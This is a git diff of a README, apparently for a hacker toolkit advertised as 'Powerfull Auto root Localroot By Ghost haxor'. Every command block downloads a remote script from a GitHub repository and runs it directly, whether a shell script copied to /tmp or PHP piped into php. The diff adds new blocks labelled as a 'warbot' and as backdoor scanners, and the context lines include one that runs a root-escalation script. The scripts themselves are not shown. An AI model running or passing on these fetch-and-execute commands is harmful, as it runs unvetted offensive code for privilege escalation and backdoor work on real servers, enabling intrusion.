@@ -14,9 +14,22 @@ curl -L https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/modro
 && /tmp/modrot.sh \
 && rm -f /tmp/modrot.sh
 ```
-# Auto Backup defend 🙂‍↔️
+# Auto Backup defend ☠️
 ```
 curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/autobackup.php | php - backup y
 ```
+# Auto Warbot ☠️
+```
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/warbot.php | php
+```
+# scanner backdoor high ☠️
+```
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/outsca.php | php
+```
+# Scanner backdoor simple ☠️
+```
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/simple.php | php
+```
+
 
 ☠️ Powerfull Auto root Localroot By Ghost haxor | Mr.W4W4N ☠️
